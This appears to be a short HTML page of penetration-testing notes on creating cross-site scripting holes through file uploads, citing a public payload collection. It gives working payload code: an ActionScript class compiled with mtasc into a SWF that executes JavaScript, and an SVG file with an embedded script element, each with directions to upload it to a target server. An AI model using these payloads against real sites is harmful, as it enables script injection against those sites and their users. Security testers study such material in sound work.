@@ -1,0 +1,41 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>XSS upload</title>
+</head><body><tt>https://github.com/MMquant/PayloadsAllTheThings/tree/master/XSS%20injection</tt><br/>
+<b><br/>
+</b><b>Create XSS vulnerability via SWF file upload</b><br/>
+<br/>
+Payload is created with ActionScript containing JavaScript which is compiled into swf file.<br/>
+This file is uploaded and when parsed by browser it executes containing javascript.<br/>
+<br/>
+ActionScript2 code<br/>
+<tt>class XSS {<br/>
+static var app: XSS;<br/>
+function XSS() {<br/>
+var xss = &quot;javascript:alert(\&quot;SWF-based XSS: \&quot;+document.<br/>
+domain)&quot;;<br/>
+getURL(xss, &quot;_self&quot;);<br/>
+}<br/>
+static function main(mc) {<br/>
+app = new XSS();<br/>
+</tt><tt>}}</tt><br/>
+<br/>
+Compile to swf with <tt>/root/Programs/mtasc/mtasc</tt><br/>
+<tt>mtasc -swf swfxss.swf -main -header 0:0:0 swfxss.as</tt><br/>
+<br/>
+Upload <tt>swfxss.swf </tt>to target server<br/>
+<br/>
+<b>Create XSS vulnerability via SVG file upload<br/>
+</b><br/>
+SVG is XML file<tt><br/>
+</tt><tt><br/>
+&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;<br/>
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;<br/>
+&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;<br/>
+ &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot; /&gt;<br/>
+ &lt;script type=&quot;text/javascript&quot;&gt;<br/>
+ alert(document.domain);<br/>
+ &lt;/script&gt;<br/>
+</tt><tt>&lt;/svg&gt;</tt><b><br/>
+</b></body></html>
